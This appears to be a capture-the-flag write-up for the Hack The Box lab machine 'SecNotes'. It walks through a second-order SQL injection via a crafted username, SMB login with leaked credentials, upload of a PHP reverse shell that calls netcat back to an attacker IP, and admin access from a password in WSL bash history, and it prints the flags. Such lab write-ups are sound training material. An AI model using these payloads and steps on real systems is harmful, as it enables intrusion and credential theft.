### SQLI

We can see a login page on port 80:

```txt
http://10.10.10.97/login.php
```

![[login.php.png]]

We can register a new user using this form:

```txt
http://10.10.10.97/register.php
```

![[register.png]]

**New user:** dev
**New pass:** devdev

```txt
http://10.10.10.97/home.php
```

**possible user:** tyler

![[home.png]]

After enumerating the web server on port 80, we find that usernames are reflected. We can exploit this by making a new user with the following name:

```txt
' or '1'='1
```

We can now see information on the home screen:

![[sqli.png]]

We can see user credentials under the *new site* note:

![[credentials.png]]

### SMB login

Now we can login to the smb server on port 445.

```txt
445/tcp open  microsoft-ds Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB)
Service Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h37m00s, deviation: 4h02m31s, median: 16m59s
| smb-os-discovery: 
|   OS: Windows 10 Enterprise 17134 (Windows 10 Enterprise 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: SECNOTES
|   NetBIOS computer name: SECNOTES\x00
|   Workgroup: HTB\x00
|_  System time: 2022-05-06T10:52:57-07:00
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-05-06T17:52:55
|_  start_date: N/A
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```

Share name to connect to: 

```txt
\\secnotes.htb\new-site
```

Credentials:

```txt
user: tyler 
pass: 92g!mA8BGjOirkL%OG*&
```

![[9-screenshots-storage/smb_login.png]]

The directory of the smb server is the root directory for the web server on port 8808.

```txt
http://10.10.10.97:8808/
```

### Reverse Shell

create a php file with a reverse shell payload:

```txt
<?php
system('nc.exe -e cmd.exe 10.10.14.4 4321')
?>
```

start a netcat listener:

```txt
nc -lvnp 4321
```

browse to the shell file:

```txt
http://10.10.10.97:8808/revshell2.php
```


download static netcat binary for windows:

```txt
wget https://github.com/int0x33/nc.exe/raw/master/nc.exe
```

we can upload the reverse shell payload and the static binary to the smb server using the following commands:

```txt
put revshell.php
put nc.exe
```

![[uplaod_revshell.png]]

we get a shell:

![[pop_shell.png]]

local.txt:

```txt
41de0a5e07b2275bf24c378d2fc117f7
```

![[user.txt.png]]

### Privesc

There is a link file for bash:

![[bash_link.png]]

We can search for the *bash.exe* file:

```txt
dir "bash.exe" /s
```

The file exists in the following directory:

```txt
C:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5
```

We can see that WSL is installed on the system, and there exists an installation of a Ubuntu image.

![[ubuntu_wsl.png]]

spawn a shell in WSL:

```txt
bash.exe -i
```

We are root in WSL:

![[wsl-root.png]]

**Get Admin**

We can see a revealing command in the root user's bash history:

![[bash_history.png]]

```txt
smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\127.0.0.1\\c$
> .bash_history
```

We can modify the command to login as *administrator* remotely

```txt
smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\10.10.10.97\\c$
```

![[smb_login 1.png]]

Now we can download the *root.txt* file with the following commands:

```txt
cd Users\Administrator\Desktop
get root.txt
```

root.txt

```txt
c93668bc8538fd2968812db50866b618
```

![[root.txt.png]]	